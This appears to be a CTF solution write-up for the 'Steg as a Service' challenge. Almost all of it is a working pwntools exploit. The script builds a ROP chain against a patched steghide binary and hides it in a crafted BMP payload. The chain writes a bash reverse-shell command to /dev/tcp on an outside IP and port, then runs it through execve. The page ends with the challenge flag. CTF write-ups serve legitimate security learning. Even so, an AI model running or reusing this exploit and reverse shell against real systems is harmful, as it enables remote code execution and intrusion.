![image](https://user-images.githubusercontent.com/63996033/229367028-39983692-f3ed-4923-b371-9fc15ec15d3c.png)

[steg.zip](https://github.com/jeromepalayoor/RITSEC-CTF-2023/blob/main/BIN-PWN/Steg%20as%20a%20Service/steg.zip) [steghide-patched](https://github.com/jeromepalayoor/RITSEC-CTF-2023/blob/main/BIN-PWN/Steg%20as%20a%20Service/steghide-patched)

Solution:
```py
from pwn import *

ip_address = b"44.202.138.115"
port = b"9999"

syscall_gadget = p64(0x00000000004066b3)
pop_rdi_gadget = p64(0x0000000000450e8b)
pop_rsi_gadget = p64(0x0000000000417f3e)
pop_rdx_gadget = p64(0x000000000042cd0c)
rdx_rax_gadget = p64(0x000000000040db3e) #: mov rax, rdx; pop rbp; ret
rdx_rax_mem_gadget = p64(0x000000000040b399) # : mov qword ptr [rax], rdx ; nop ; pop rbp ; ret

def write_what_where(addr, val):
    assert(len(val) <= 8)
    p = pop_rdx_gadget
    p += p64(addr)
    p += rdx_rax_gadget
    p += p64(0x400000)
    p += pop_rdx_gadget
    p += val.ljust(8, b"\x00")
    p += rdx_rax_mem_gadget
    p += p64(0x400000)
    return p

writable_base = 0x48aaa8

write_address = writable_base

base = b"\x42\x4d\x1a\x1b\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x0c\x00\x00\x00\xff\x7f\x00\x00\x01\x00\x18\x00\x6c\x8c\xa2\x61\x86\x9d\x59\x7e\x95\x4f\x7b\x97\x40\x71\x93\x35\x69\x90\x39\x6e\x93\x3a\x6f\x94\x3d\x71\x96\x3c\x71\x95\x41\x73\x97\x43\x76\x99\x42\x75\x98\x3e\x72\x99\x40\x70\x97\x41\x74\x97\x41\x78\x9f\x49\x7f\xa3\x4f\x82"
rop = write_what_where(write_address, b"/bin/bas")
rop += write_what_where(write_address + 8, b"h")
binbash_addr = write_address
write_address += 16

rop += write_what_where(write_address, b"-c")
dashc_address = write_address
write_address += 8

revshell_cmd = b"bash -i >& /dev/tcp/" + ip_address + b"/" + port + b" 0>&1"
numwrites = int((len(revshell_cmd)/8) + 1)
for i in range(0, int(numwrites)):
    rop += write_what_where(write_address + (8*i), revshell_cmd[i*8:(i*8)+8])

revshell_addr = write_address
write_address += 8*numwrites + 8

rop += write_what_where(write_address, p64(binbash_addr))
rop += write_what_where(write_address+8, p64(dashc_address))
rop += write_what_where(write_address+16, p64(revshell_addr))

rop += pop_rdi_gadget
rop += p64(binbash_addr)
rop += pop_rsi_gadget
rop += p64(write_address)
rop += pop_rdx_gadget
rop += p64(0x3b)
rop += rdx_rax_gadget
rop += p64(0x400000)
rop += pop_rdx_gadget
rop += p64(0)

rop += syscall_gadget

#print len(rop)
print (base + rop)
final = base+rop
with open("payload.bmp", "w+b") as fd:
    fd.write(final)
```

Flag: `MetaCTF{St3gh1d3_15_re4lly_tru3ly_3v3rywhere_17_s33m5}`
